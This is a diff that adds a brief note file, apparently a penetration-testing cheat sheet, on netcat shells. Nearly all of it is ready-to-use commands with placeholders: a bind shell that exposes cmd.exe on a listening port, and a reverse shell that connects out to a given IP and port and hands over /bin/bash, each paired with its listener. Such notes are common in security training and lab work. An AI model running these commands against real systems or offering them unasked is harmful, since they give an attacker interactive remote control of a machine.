@@ -1,0 +1,15 @@
+Important that this will redirect any process to network
+-e redirects input output from the process to network
+Bind shell
+Server
+nc -lvpn {PORT} -e cmd.exe
+
+Client
+nc -nv {IP} {PORT}
+
+Reerse shell
+Server
+nc -nv {IP} {PORT} -e /bin/bash
+
+Client
+nc -lvpn {PORT}
